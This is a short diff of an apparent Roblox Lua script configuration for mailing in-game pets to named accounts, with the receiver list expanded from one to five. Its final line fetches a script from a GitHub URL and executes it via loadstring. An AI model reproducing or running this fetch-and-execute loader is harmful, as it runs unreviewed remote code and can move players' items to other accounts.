@@ -39,7 +39,7 @@ getgenv().GMAIL_ITEMS = {
     ["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},
 }
 getgenv().GMAIL_RECEIVERS = {
-    "Thien_Hoa9x"
+    "Zephy_Marnell604", "Dravon_Liorrex220", "Taryn_Xelvorn389", "Valric_Solvynn026", "Zarek_Maelith750"
 }
 getgenv().GMAIL_DELAY = 0
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/GScripts-Rank-ALL"))()
